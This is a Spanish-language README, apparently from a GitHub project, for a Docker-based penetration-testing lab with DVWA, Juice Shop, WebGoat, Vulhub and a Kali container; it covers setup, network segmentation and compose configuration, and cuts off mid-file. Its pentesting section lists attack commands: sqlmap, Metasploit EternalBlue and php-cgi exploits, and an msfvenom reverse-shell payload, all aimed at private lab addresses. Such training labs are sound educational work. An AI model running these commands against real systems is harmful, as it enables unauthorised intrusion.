# 🎯 Apache Docker Project + Vulhub - Laboratorio Completo de Penetration Testing

[
[
[
[

## 📋 Tabla de Contenidos

- [🎯 Descripción General](#-descripción-general)
- [🏗️ Arquitectura Completa](#-arquitectura-completa)
- [🚀 Instalación y Configuración](#-instalación-y-configuración)
- [📊 Servicios y Aplicaciones](#-servicios-y-aplicaciones)
- [🔧 Gestión y Administración](#-gestión-y-administración)
- [🌐 Máquinas Virtuales y Vulhub](#-máquinas-virtuales-y-vulhub)
- [🎯 Escenarios de Pentesting](#-escenarios-de-pentesting)
- [🪟 Comandos Específicos Windows](#-comandos-específicos-windows)
- [🔒 Seguridad y Mejores Prácticas](#-seguridad-y-mejores-prácticas)
- [🔍 Solución de Problemas](#-solución-de-problemas)
- [📚 Documentación Técnica Completa](#-documentación-técnica-completa)
- [🧪 Laboratorio y Evidencias](#-laboratorio-y-evidencias)
- [📄 Licencia y Contribución](#-licencia-y-contribución)

## 🎯 Descripción General

**Apache Docker Project + Vulhub** es un laboratorio completo de penetration testing diseñado específicamente para entrenamiento en ciberseguridad ética. Este proyecto implementa una infraestructura completa basada en Docker que simula un entorno empresarial real con múltiples aplicaciones web vulnerables, segmentación de red avanzada y herramientas de monitoreo integral.

### ✨ Características Principales

- 🌐 **Aplicaciones Web Vulnerables**: DVWA, Juice Shop, WebGoat, Mutillidae
- 🖥️ **Máquinas Virtuales Adicionales**: Vulhub con 500+ entornos vulnerables
- 🔒 **Segmentación de Red Avanzada**: DMZ, LAN, redes de atacantes y extendida
- 📊 **Monitoreo Integrado**: ELK Stack + Prometheus/Grafana
- 🤖 **Automatización Completa**: Scripts para despliegue y gestión
- 🛡️ **Firewall Integrado**: Configuración automatizada con iptables
- 🔧 **Gestión Centralizada**: Scripts para backup, restore y control completo
- 🎓 **Escenarios Educativos**: Desde nivel básico hasta avanzado

## 🏗️ Arquitectura Completa

### Diagrama de Red Segmentada

```
Internet (WAN)
│
▼
┌─────────────────┐
│   Firewall      │ ← Simulado con iptables
└─────────────────┘
│
▼
┌─────────────────────────────────────────────────────────┐
│                     DMZ Network (192.168.90.0/24)      │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │
│  │   Apache    │  │    DVWA     │  │ Juice Shop  │     │
│  │   :8080     │  │    :8080    │  │   :3000     │     │
│  └─────────────┘  └─────────────┘  └─────────────┘     │
│  ┌─────────────┐  ┌─────────────┐                      │
│  │  WebGoat    │  │ Mutillidae  │                      │
│  │   :8081     │  │   :8082     │                      │
│  └─────────────┘  └─────────────┘                      │
└─────────────────────────────────────────────────────────┘
│
▼
┌─────────────────────────────────────────────────────────┐
│                     LAN Network (192.168.1.0/24)       │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │
│  │   MySQL     │  │  Monitoring │  │   Kali      │     │
│  │ Vulnerable  │  │   Services  │  │  Attacker   │     │
│  │   :3306     │  │ELK+Grafana  │  │ (Tools)     │     │
│  └─────────────┘  └─────────────┘  └─────────────┘     │
│  ┌─────────────┐  ┌─────────────┐                      │
│  │SSH Honeypot │  │FTP Vuln Srv │                      │
│  │   :2222     │  │    :21      │                      │
│  └─────────────┘  └─────────────┘                      │
└─────────────────────────────────────────────────────────┘
│
▼
┌─────────────────────────────────────────────────────────┐
│              Extended Network (192.168.100.0/24)       │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │
│  │ Metasploita │  │ Ubuntu Vuln │  │ Windows Svr │     │
│  │   :2223     │  │   :2224     │  │   :3390     │     │
│  └─────────────┘  └─────────────┘  └─────────────┘     │
│  ┌─────────────┐  ┌─────────────┐                      │
│  │Custom Vulnhub│  │ Additional  │                      │
│  │  Services   │  │  Targets    │                      │
│  └─────────────┘  └─────────────┘                      │
└─────────────────────────────────────────────────────────┘
```

### Componentes de Red

| Red | Subnet | Función | Componentes |
|-----|--------|---------|-------------|
| **DMZ** | 192.168.90.0/24 | Servicios web públicos | Apache, DVWA, Juice Shop, WebGoat, Mutillidae |
| **LAN** | 192.168.1.0/24 | Servicios internos | MySQL, ELK Stack, Kali Linux, Honeypots |
| **Extended** | 192.168.100.0/24 | Máquinas adicionales | Vulhub containers, OS targets |
| **Monitoring** | 172.20.0.0/24 | Monitoreo | Grafana, Prometheus, Kibana |

## 🚀 Instalación y Configuración

### Prerrequisitos del Sistema

**Sistemas Operativos Soportados:**
- Windows 11 Pro (con WSL 2)
- Linux Ubuntu 20.04+ / CentOS 8+ / Debian 11+
- macOS Big Sur+

**Software Requerido:**
- Docker Desktop 20.10+ ([Instalación](https://www.docker.com/products/docker-desktop))
- Docker Compose 2.0+ (incluido en Docker Desktop)
- Git 2.30+ ([Instalación](https://git-scm.com/downloads))

**Recursos Mínimos:**
- RAM: 8 GB mínimo (16 GB recomendado para laboratorio completo)
- Almacenamiento: 20 GB libres mínimo (40 GB recomendado)
- CPU: 4 cores recomendado
- Red: Conexión a internet para descarga inicial
- Puertos disponibles: 8080, 3000, 8081, 8082, 2222, 21, 3306, 5601, 3001

### Instalación Automatizada (Recomendada)

#### Método 1: Script Automatizado Completo

```bash
# 1. Clonar el repositorio
git clone https://github.com/JosephJMRG/apache-docker-project.git
cd apache-docker-project

# 2. Dar permisos de ejecución
chmod +x automatizar_lab_completo.sh

# 3. Ejecutar automatización completa
./automatizar_lab_completo.sh
```

**El script automatizado realiza:**
- Verificación de requisitos (Docker, Git)
- Solución de conflictos de puerto (IIS, WinNAT)
- Configuración de entorno Git Bash/WSL
- Creación de estructura de directorios
- Descarga e integración de Vulhub
- Inicio de todos los servicios
- Verificación de estado del laboratorio

#### Método 2: Instalación Manual Paso a Paso

```bash
# 1. Clonar repositorio
git clone https://github.com/JosephJMRG/apache-docker-project.git
cd apache-docker-project

# 2. Configurar permisos
chmod +x scripts/management/*.sh
chmod +x scripts/setup/*.sh

# 3. Configurar redes Docker
sudo scripts/setup/setup-networks.sh

# 4. Configurar firewall
sudo scripts/setup/configure-firewall.sh

# 5. Iniciar laboratorio
docker-compose up -d

# 6. Configurar Vulhub (opcional)
mkdir vulhub-extensions
cd vulhub-extensions
git clone --depth 1 https://github.com/vulhub/vulhub.git
```

### Instalación en Windows 11

#### Preparación del Sistema Windows

```powershell
# Como Administrador - Habilitar WSL 2 y Características
dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart

# Reiniciar sistema
shutdown /r /t 0
```

#### Configuración de Firewall Windows

```powershell
# Configurar reglas de firewall para servicios del laboratorio
New-NetFirewallRule -DisplayName "Apache HTTP" -Direction Inbound -Port 8080 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "DVWA" -Direction Inbound -Port 8080 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "Juice Shop" -Direction Inbound -Port 3000 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "WebGoat" -Direction Inbound -Port 8081 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "Mutillidae" -Direction Inbound -Port 8082 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "SSH Honeypot" -Direction Inbound -Port 2222 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "FTP Vulnerable" -Direction Inbound -Port 21 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "MySQL" -Direction Inbound -Port 3306 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "Kibana" -Direction Inbound -Port 5601 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "Grafana" -Direction Inbound -Port 3001 -Protocol TCP -Action Allow
```

#### Ejecutar Script Principal

```bash
# Después del reinicio - Ejecutar desde Git Bash o WSL
./automatizar_lab_completo.sh
```

## 📊 Servicios y Aplicaciones

### Aplicaciones Web Vulnerables

| Servicio | URL | Credenciales | Descripción | Vulnerabilidades Principales |
|----------|-----|--------------|-------------|------------------------------|
| **Apache Principal** | http://localhost:8080 | N/A | Servidor web principal | File inclusion, Path traversal |
| **DVWA** | http://localhost:8080 | admin/password | Damn Vulnerable Web App | SQL Injection, XSS, CSRF, File Upload |
| **OWASP Juice Shop** | http://localhost:3000 | N/A | OWASP Top 10 challenges | Broken Auth, Sensitive Data, XXE |
| **WebGoat** | http://localhost:8081 | N/A | Entrenamiento OWASP | Injection, Broken Access Control |
| **Mutillidae** | http://localhost:8082 | N/A | Multi-vulnerabilidades | OWASP Top 25, Input Validation |

### Servicios de Red y Sistema

| Servicio | Puerto | Protocolo | Credenciales | Función |
|----------|--------|-----------|--------------|---------|
| **SSH Honeypot** | 2222 | TCP | vulnerable/password | Simulación SSH vulnerable |
| **FTP Vulnerable** | 21 | TCP | anonymous/anonymous | Servidor FTP con vulnerabilidades |
| **MySQL Vulnerable** | 3306 | TCP | root/password | Base de datos con configuración insegura |

### Herramientas de Monitoreo

| Servicio | URL | Credenciales | Descripción |
|----------|-----|--------------|-------------|
| **Kibana** | http://localhost:5601 | N/A | Visualización de logs y análisis |
| **Grafana** | http://localhost:3001 | admin/admin | Métricas y dashboards |
| **Prometheus** | http://localhost:9090 | N/A | Recolección de métricas |

### Contenedor de Ataque

| Contenedor | Función | Herramientas Incluidas |
|------------|---------|------------------------|
| **Kali Linux** | Plataforma de pentesting | Nmap, Metasploit, SQLMap, Nikto, Burp Suite, etc. |

## 🔧 Gestión y Administración

### Controlador Principal del Laboratorio

```bash
# Script centralizado de gestión
./scripts/management/lab-controller.sh [comando]

# Comandos disponibles:
start       # Iniciar laboratorio completo
stop        # Detener laboratorio
status      # Ver estado de todos los servicios
attack      # Acceder a Kali Linux
logs        # Ver logs del sistema
cleanup     # Limpiar entorno completo
vulhub      # Gestionar máquinas Vulhub
deploy      # Desplegar vulnerabilidad específica
```

### Comandos Docker Compose Básicos

```bash
# Gestión de contenedores
docker-compose up -d              # Iniciar todos los servicios
docker-compose ps                 # Ver estado de contenedores
docker-compose logs -f            # Ver logs en tiempo real
docker-compose logs [servicio]    # Ver logs de servicio específico
docker-compose stop              # Detener servicios
docker-compose down              # Detener y eliminar contenedores
docker-compose down -v           # Incluir eliminación de volúmenes
docker-compose restart           # Reiniciar servicios
docker-compose pull              # Actualizar imágenes
```

### Gestión de Backup y Restore

```bash
# Crear backup completo del laboratorio
scripts/management/backup-lab.sh

# Restaurar desde backup
scripts/management/restore-lab.sh ./backups/lab-backup-[fecha]

# Verificar integridad del backup
scripts/management/verify-backup.sh ./backups/lab-backup-[fecha]
```

### Acceso a Contenedores

```bash
# Acceder a Kali Linux
docker-compose exec kali-attacker /bin/bash

# Acceder a Apache
docker-compose exec apache-server /bin/bash

# Acceder a DVWA
docker-compose exec dvwa /bin/bash

# Ejecutar comando específico en contenedor
docker-compose exec [servicio] [comando]

# Acceder como usuario específico
docker-compose exec --user root [servicio] /bin/bash
```

## 🌐 Máquinas Virtuales y Vulhub

### Gestión de Vulhub

```bash
# Ver todas las categorías disponibles
./scripts/management/deploy-vulhub.sh

# Listar vulnerabilidades de una categoría específica
./scripts/management/deploy-vulhub.sh apache
./scripts/management/deploy-vulhub.sh mysql
./scripts/management/deploy-vulhub.sh spring

# Desplegar vulnerabilidad específica
./scripts/management/deploy-vulhub.sh apache CVE-2021-41773
./scripts/management/deploy-vulhub.sh mysql CVE-2012-2122
./scripts/management/deploy-vulhub.sh spring CVE-2022-22947

# Ver entornos Vulhub activos
./scripts/management/deploy-vulhub.sh --list-active

# Limpiar todos los entornos Vulhub
./scripts/management/deploy-vulhub.sh --cleanup
```

### Categorías Populares de Vulhub

| Categoría | Descripción | Ejemplos de CVE |
|-----------|-------------|----------------|
| **apache** | Vulnerabilidades Apache HTTP Server | CVE-2021-41773, CVE-2021-42013 |
| **mysql** | Vulnerabilidades MySQL | CVE-2012-2122, CVE-2016-6662 |
| **spring** | Vulnerabilidades Spring Framework | CVE-2022-22947, CVE-2022-22963 |
| **tomcat** | Vulnerabilidades Apache Tomcat | CVE-2017-12615, CVE-2020-1938 |
| **docker** | Vulnerabilidades Docker | CVE-2019-5736, CVE-2019-14271 |
| **nginx** | Vulnerabilidades Nginx | CVE-2013-2028, CVE-2017-7529 |
| **wordpress** | Vulnerabilidades WordPress | CVE-2019-17671, CVE-2020-4047 |
| **jenkins** | Vulnerabilidades Jenkins | CVE-2018-1000861, CVE-2019-1003000 |

### Despliegue Manual de Vulhub

```bash
# Navegar a vulnerabilidad específica
cd vulhub-extensions/vulhub/apache/CVE-2021-41773

# Iniciar entorno vulnerable
docker compose up -d

# Verificar estado del entorno
docker compose ps

# Ver logs del entorno
docker compose logs -f

# Conectar a red específica
docker network connect lab_extended_network [contenedor]

# Limpiar después de usar
docker compose down -v
```

### Configuración de Redes Personalizadas

```yaml
# Editar configs/security/network-config.yml
networks:
  extended_network:
    subnet: 192.168.200.0/24  # Personalizar subnet extendida
    gateway: 192.168.200.1
  custom_lab_network:
    subnet: 10.10.10.0/24     # Red personalizada adicional
    gateway: 10.10.10.1
```

## 🎯 Escenarios de Pentesting

### Niveles de Entrenamiento

| Nivel | Enfoque | Herramientas | Objetivos |
|-------|---------|--------------|-----------|
| **Principiante** | Web Vulnerabilities | SQLMap, Nikto, Dirb | SQL Injection, XSS básico |
| **Intermedio** | Network Exploitation | Metasploit, Nmap avanzado | Lateral movement, Service exploitation |
| **Avanzado** | Red Team Operations | Cobalt Strike, Custom Exploits | APT simulation, Persistence |
| **Extendido** | OS-Level Vulnerabilities | Kernel Exploits, Service Vulns | Privilege escalation, Container escape |

### Comandos de Pentesting por Nivel

#### Nivel Principiante

```bash
# Reconocimiento básico de red
nmap -sn 192.168.90.0/24

# Escaneo de puertos básico
nmap -sS 192.168.90.0/24

# Escaneo web básico
nikto -h http://192.168.90.10:8080
dirb http://192.168.90.10:8080

# SQL Injection básico
sqlmap -u "http://192.168.90.10:8080/vulnerabilities/sqli/?id=1" --dbs
```

#### Nivel Intermedio

```bash
# Escaneo avanzado con detección de servicios
nmap -sS -sV -sC 192.168.90.0/24

# Escaneo de vulnerabilidades
nmap --script vuln 192.168.90.10

# Explotación con Metasploit
msfconsole
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS 192.168.90.10
exploit

# Análisis de tráfico
tcpdump -i any -w capture.pcap host 192.168.90.10
```

#### Nivel Avanzado

```bash
# Escaneo sigiloso
nmap -sS -T2 -f 192.168.90.0/24

# Explotación de servicio Windows (Vulhub)
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.100.12; run"

# Movimiento lateral
proxychains nmap -sT 192.168.1.0/24

# Análisis de memoria
volatility -f memory.dump imageinfo
```

#### Nivel Extendido (Vulhub)

```bash
# Análisis de vulnerabilidades con Vulhub
./scripts/management/lab-controller.sh vulhub spring

# Explotación de contenedores
docker exec -it [vulhub_container] /bin/bash

# Escalación de privilegios
./scripts/management/deploy-vulhub.sh docker CVE-2019-5736

# Custom exploit development
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf
```

### Rutas de Aprendizaje Recomendadas

#### Ruta 1: Web Application Security

1. **DVWA**: SQL Injection → XSS → CSRF → File Upload
2. **Juice Shop**: Broken Authentication → Sensitive Data → XXE
3. **WebGoat**: Injection → Broken Access Control → Security Misconfiguration
4. **Mutillidae**: Input Validation → Session Management → Cryptography

#### Ruta 2: Network Penetration Testing

1. **Reconocimiento**: Nmap, DNS enumeration
2. **Vulnerability Assessment**: OpenVAS, Nessus equivalents
3. **Exploitation**: Metasploit, custom exploits
4. **Post-Exploitation**: Persistence, privilege escalation

#### Ruta 3: Advanced Red Team Operations

1. **Infrastructure**: Vulhub environments
2. **Persistence**: Backdoors, rootkits
3. **Lateral Movement**: Pivoting, tunneling
4. **Evasion**: AV bypass, anti-forensics

## 🪟 Comandos Específicos Windows

### Gestión de Servicios IIS

```powershell
# Detener servicios IIS temporalmente
Stop-Service -Name "W3SVC" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "WAS" -Force -ErrorAction SilentlyContinue

# Verificar estado de servicios
Get-Service -Name "W3SVC", "WAS"

# Restaurar servicios IIS después del laboratorio
Start-Service -Name "W3SVC"
Start-Service -Name "WAS"

# Deshabilitar servicios permanentemente (opcional)
Set-Service -Name "W3SVC" -StartupType Disabled
Set-Service -Name "WAS" -StartupType Disabled
```

### Gestión de WinNAT

```powershell
# Reiniciar WinNAT para liberar puertos
net stop winnat
Start-Sleep -Seconds 5
net start winnat

# Verificar configuración de WinNAT
Get-NetNat

# Limpiar configuraciones de NAT
Get-NetNat | Remove-NetNat -Confirm:$false
```

### Configuración de Docker en Windows

```powershell
# Verificar Docker Desktop
docker info

# Configurar Docker para usar WSL 2
wsl --set-default-version 2

# Verificar integración WSL
wsl --list --verbose

# Configurar memoria para WSL 2 (crear .wslconfig)
@"
[wsl2]
memory=8GB
processors=4
swap=2GB
"@ | Out-File -FilePath "$env:USERPROFILE\.wslconfig" -Encoding ASCII
```

### Diagnóstico de Puertos en Windows

```powershell
# Verificar puertos en uso
netstat -ano | findstr :80
netstat -ano | findstr :8080
netstat -ano | findstr :3000

# Identificar proceso usando puerto específico
Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess

# Forzar liberación de puerto
taskkill /F /PID [PID_NUMBER]
```

### Configuración de Firewall Windows

```powershell
# Crear reglas específicas para el laboratorio
$ports = @(8080, 3000, 8081, 8082, 2222, 21, 3306, 5601, 3001)
foreach ($port in $ports) {
    New-NetFirewallRule -DisplayName "Lab-Port-$port" -Direction Inbound -Port $port -Protocol TCP -Action Allow
}

# Verificar reglas creadas
Get-NetFirewallRule -DisplayName "Lab-Port-*"

# Eliminar reglas del laboratorio después del uso
Get-NetFirewallRule -DisplayName "Lab-Port-*" | Remove-NetFirewallRule
```

## 🔒 Seguridad y Mejores Prácticas

### Advertencias Críticas de Seguridad

#### 🔴 EXCLUSIVAMENTE PARA LABORATORIO

- **Contiene vulnerabilidades REALES** en aplicaciones y sistemas operativos
- **NUNCA exponer a internet** - Mantener en red local completamente aislada
- **NO usar en redes de producción** bajo ninguna circunstancia
- **Limpiar entornos después de cada uso** con comandos de cleanup
- **Reportar vulnerabilidades críticas reales** siguiendo políticas de divulgación responsable

#### Consideraciones Legales y Éticas

- ✅ **Autorización requerida** para cualquier prueba fuera del laboratorio
- ✅ **Registrar todas las actividades** con fines de documentación y aprendizaje
- ✅ **No almacenar datos reales** en los sistemas vulnerables
- ✅ **Respetar leyes locales** de ciberseguridad y penetration testing
- ❌ **Responsabilidad del usuario** por cualquier uso indebido

### Configuración Segura del Laboratorio

#### Headers de Seguridad HTTP

```apache
# Configuración en Apache (configs/apache/security.conf)
Header always set X-Frame-Options "SAMEORIGIN"
Header always set X-Content-Type-Options "nosniff"
Header always set X-XSS-Protection "1; mode=block"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header always set Content-Security-Policy "default-src 'self'"
```

#### Configuración de Firewall Interno

```bash
# Configuración iptables (scripts/setup/configure-firewall.sh)
#!/bin/bash

# Limpiar reglas existentes
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X

# Políticas por defecto
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Permitir tráfico loopback
iptables -A INPUT -i lo -j ACCEPT

# Permitir conexiones establecidas
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Permitir SSH (para administración)
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Permitir puertos del laboratorio
for port in 8080 3000 8081 8082 2222 21 3306 5601 3001; do
    iptables -A INPUT -p tcp --dport $port -j ACCEPT
done

# Logging de conexiones rechazadas
iptables -A INPUT -j LOG --log-prefix "DROPPED: "
iptables -A INPUT -j DROP
```

#### Configuración de Contenedores Seguros

```yaml
# docker-compose.yml - Configuraciones de seguridad
version: '3.8'
services:
  apache-server:
    security_opt:
      - no-new-privileges:true
    read_only: true
    tmpfs:
      - /var/run
      - /var/lock
      - /tmp
    user: "1000:1000"
    
  dvwa:
    cap_drop:
      - ALL
    cap_add:
      - CHOWN
      - SETUID
      - SETGID
```

### Procedimientos de Limpieza

#### Script de Limpieza Completa

```bash
#!/bin/bash
# scripts/management/complete-cleanup.sh

echo "=== LIMPIEZA COMPLETA DEL LABORATORIO ==="

# Detener y eliminar contenedores
docker-compose down -v

# Eliminar imágenes del laboratorio
docker rmi $(docker images --filter "reference=*apache-docker-project*" -q)

# Limpiar redes Docker
docker network prune -f

# Limpiar volúmenes
docker volume prune -f

# Limpiar datos temporales
rm -rf ./logs/*
rm -rf ./backups/temp/*

# Verificar limpieza
docker ps -a
docker images
docker network ls
docker volume ls

echo "Limpieza completa realizada"
```

#### Verificación de Seguridad Post-Limpieza

```bash
# Verificar que no hay contenedores ejecutándose
docker ps

# Verificar que no hay puertos abiertos del laboratorio
netstat -tlnp | grep -E ":(8080|3000|8081|8082|2222|21|3306|5601|3001)"

# Verificar reglas de firewall
iptables -L

# Verificar servicios Windows restaurados (Windows)
Get-Service -Name "W3SVC", "WAS"
```

## 🔍 Solución de Problemas

### Problemas Comunes y Soluciones

#### Error "ports are not available"

**Problema**: `Error response from daemon: ports are not available: exposing port TCP 0.0.0.0:80`

**Soluciones por orden de efectividad**:

```powershell
# Solución 1: Detener IIS
Stop-Service -Name 'W3SVC' -Force
Stop-Service -Name 'WAS' -Force

# Solución 2: Reiniciar WinNAT
net stop winnat
net start winnat

# Solución 3: Identificar proceso específico
netstat -ano | findstr :80
taskkill /F /PID [PID_NUMBER]
```

#### Docker Desktop No Responde

```bash
# Linux/WSL
sudo systemctl restart docker

# Windows
# Reiniciar Docker Desktop desde la aplicación

# Verificar estado
docker info
docker version
```

#### Problemas de Red Docker

```bash
# Verificar redes existentes
docker network ls

# Recrear redes del laboratorio
docker network rm lab_dmz_network lab_lan_network lab_extended_network
scripts/setup/setup-networks.sh

# Verificar conectividad entre contenedores
docker exec kali-attacker ping 192.168.90.10
docker exec dvwa ping 192.168.1.10
```

#### Problemas con Vulhub

```bash
# Verificar estructura de Vulhub
ls -la vulhub-extensions/vulhub/

# Actualizar repositorio Vulhub
cd vulhub-extensions/vulhub
git pull origin master

# Limpiar contenedores Vulhub problemáticos
./scripts/management/deploy-vulhub.sh --cleanup

# Conectar contenedor a red específica
docker network connect lab_extended_network [contenedor_vulhub]
```

#### Problemas de Permisos (Linux)

```bash
# Agregar usuario al grupo docker
sudo usermod -aG docker $USER
newgrp docker

# Verificar permisos de archivos
chmod +x scripts/**/*.sh

# Corregir propiedad de archivos
sudo chown -R $USER:$USER ./

# Reiniciar sesión si es necesario
sudo su - $USER
```

#### Problemas de Memoria/Recursos

```bash
# Verificar uso de recursos
docker stats

# Limitar recursos de contenedores
docker-compose up -d --scale dvwa=1 --scale juice-shop=1

# Configurar límites en docker-compose.yml
services:
  dvwa:
    deploy:
      resources:
        limits:
          memory: 512M
          cpus: '0.5'
```

### Logs y Diagnóstico

#### Ubicaciones de Logs

```bash
# Logs del laboratorio
./logs/apache/
./logs/dvwa/
./logs/kali/
./logs/system/

# Logs de Docker
docker-compose logs
docker logs [container_name]

# Logs del sistema (Linux)
/var/log/docker.log
journalctl -u docker
```

#### Script de Diagnóstico Automático

```bash
#!/bin/bash
# scripts/management/diagnostics.sh

echo "=== DIAGNÓSTICO DEL LABORATORIO ==="

echo "1. Verificando Docker..."
docker --version
docker-compose --version
docker info | grep -E "Server Version|Storage Driver|Operating System"

echo "2. Verificando contenedores..."
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"

echo "3. Verificando redes..."
docker network ls --format "table {{.Name}}\t{{.Driver}}\t{{.Scope}}"

echo "4. Verificando puertos..."
netstat -tlnp | grep -E ":(8080|3000|8081|8082|2222|21|3306|5601|3001)"

echo "5. Verificando espacio en disco..."
df -h
docker system df

echo "6. Verificando memoria..."
free -h
docker stats --no-stream

echo "7. Verificando logs recientes..."
docker-compose logs --tail=10
```

### Recursos de Soporte

#### Documentación Oficial

- [Docker Documentation](https://docs.docker.com/)
- [Docker Compose Reference](https://docs.docker.com/compose/)
- [Vulhub Official Documentation](https://vulhub.org/)

#### Comunidad y Soporte

- **GitHub Issues**: [apache-docker-project/issues](https://github.com/JosephJMRG/apache-docker-project/issues)
- **OWASP Resources**: [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- **Kali Linux Documentation**: [Kali Tools](https://tools.kali.org/)

## 📚 Documentación Técnica Completa

### Estructura del Proyecto

```
apache-docker-project/
├── automatizar_lab_completo.sh          # Script principal de automatización
├── docker-compose.yml                   # Configuración principal de servicios
├── docker-compose.yml.backup           # Backup de configuración
├── Dockerfile                          # Imagen personalizada del laboratorio
├── scripts/
│   ├── management/
│   │   ├── lab-controller.sh           # Controlador principal
│   │   ├── deploy-vulhub.sh           # Gestor de Vulhub
│   │   ├── backup-lab.sh              # Script de backup
│   │   ├── restore-lab.sh             # Script de restore
│   │   └── diagnostics.sh             # Diagnóstico automático
│   └── setup/
│       ├── setup-networks.sh          # Configuración de redes
│       ├── configure-firewall.sh      # Configuración de firewall
│       └── install-dependencies.sh    # Instalación de dependencias
├── config/
│   ├── apache/                        # Configuraciones Apache
│   ├── security/                      # Configuraciones de seguridad
│   └── monitoring/                    # Configuraciones de monitoreo
├── vulhub-extensions/
│   └── vulhub/                        # Repositorio Vulhub clonado
├── backups/                           # Backups del laboratorio
├── logs/                              # Logs del sistema
├── lab-components/                    # Componentes del laboratorio
├── sites-available/                   # Sitios Apache disponibles
├── sites-enabled/                     # Sitios Apache habilitados
└── www/PwotoSite.cl/                 # Sitio web principal
```

### Configuraciones Avanzadas

#### Docker Compose Completo

```yaml
version: '3.8'

networks:
  dmz_network:
    driver: bridge
    ipam:
      config:
        - subnet: 192.168.90.0/24
          gateway: 192.168.90.1
  lan_network:
    driver: bridge
    ipam:
      config:
        - subnet: 192.168.1.0/24
          gateway: 192.168.1.1
  extended_network:
    driver: bridge
    ipam:
      config:
        - subnet: 192.168.100.0/24
          gateway: 192.168.100.1
  monitoring_network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
          gateway: 172.20.0.1

services:
  apache-server:
    build: .
    container_name: apache-main
    networks:
      dmz_network:
        ipv4_address: 192.168.90.10
    ports:
      - "8080:80"
    volumes:
      - ./www:/var/www/html
      - ./config/apache:/etc/apache2/conf-available
    environment:
      - APACHE_RUN_USER=www-data
      - APACHE_RUN_GROUP=www-data

  dvwa:
    image: vulnerables/web-dvwa
    container_name: dvwa-target
    networks:
      dmz_network:
        ipv4_address: 192.168.90.11
    ports:
      - "8080:80"
    environment:
      - MYSQL_HOSTNAME=mysql-vulnerable
      - MYSQL_DATABASE=dvwa
      - MYSQL_USERNAME=dvwa
      - MYSQL_PASSWORD=p@ssw0rd

  juice-shop:
    image: bkimminich/juice-shop
    container_name: juice-shop-target
    networks:
      dmz_network:
        ipv4_address: 192.168.90.12
    ports:
      - "3000:3000"

  webgoat:
    image: webgoat/goatandwolf
    container_name: webgoat-target
    networks:
      dmz_network:
        ipv4_address: 192.168.90.13
    ports:
      - "8081:8080"

  mutillidae:
    image: citizenstig/nowasp
    container_name: mutillidae-target
    networks:
      dmz_network:
        ipv4_address: 192.168.90.14
    ports:
      - "8082:80"

  mysql-vulnerable:
    image: mysql:5.7
    container_name: mysql-vulnerable
    networks:
      lan_network:
        ipv4_address: 192.168.1.10
    ports:
      - "3306:3306"
    environment:
      - MYSQL_ROOT_PASSWORD=password
      - MYSQL_DATABASE=dvwa
      - MYSQL_USER=dvwa
      - MYSQL_PASSWORD=p@ssw0rd
    command: --default-authentication-plugin=mysql_native_password

  kali-attacker:
    image: kalilinux/kali-rolling
    container_name: kali-attacker
    networks:
      - lan_network
      - dmz_network
      - extended_network
    stdin_open: true
    tty: true
    privileged: true
    volumes:
      - ./logs/kali:/var/log
    command: /bin/bash

  ssh-honeypot:
    image: cowrie/cowrie
    container_name: ssh-honeypot
    networks:
      lan_network:
        ipv4_address: 192.168.1.11
    ports:
      - "2222:2222"

  ftp-vulnerable:
    image: stilliard/pure-ftpd
    container_name: ftp-vulnerable
    networks:
      lan_network:
        ipv4_address: 192.168.1.12
    ports:
      - "21:21"
    environment:
      - PUBLICHOST=192.168.1.12
      - FTP_USER_NAME=anonymous
      - FTP_USER_PASS=anonymous
      - FTP_USER_HOME=/home/anonymous

  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:7.14.0
    container_name: elasticsearch
    networks:
      monitoring_network:
        ipv4_address: 172.20.0.10
    environment:
      - discovery.type=single-node
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"

  kibana:
    image: docker.elastic.co/kibana/kibana:7.14.0
    container_name: kibana
    networks:
      monitoring_network:
        ipv4_address: 172.20.0.11
    ports:
      - "5601:5601"
    depends_on:
      - elasticsearch

  grafana:
    image: grafana/grafana:latest
    container_name: grafana
    networks:
      monitoring_network:
        ipv4_address: 172.20.0.12
    ports:
      - "3001:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin

  prometheus:
    image: prom/prometheus:latest
    container_name: prometheus
    networks:
      monitoring_network:
        ipv4_address: 172.20.0.13
    ports:
      - "9090:9090"
    volumes:
      - ./config/monitoring/prometheus.yml:/etc/prometheus/prometheus.yml
```

### Configuración de Monitoreo

#### Prometheus Configuration

```yaml
# config/monitoring/prometheus.yml
global:
  scrape_interval: 15s

scrape_configs:
  - job_name: 'prometheus'
    static_configs:
      - targets: ['localhost:9090']

  - job_name: 'apache'
    static_configs:
      - targets: ['192.168.90.10:80']

  - job_name: 'docker'
    static_configs:
      - targets: ['host.docker.internal:9323']
```

#### Grafana Dashboard

```json
{
  "dashboard": {
    "id": null,
    "title": "Apache Docker Project Dashboard",
    "panels": [
      {
        "title": "Container Status",
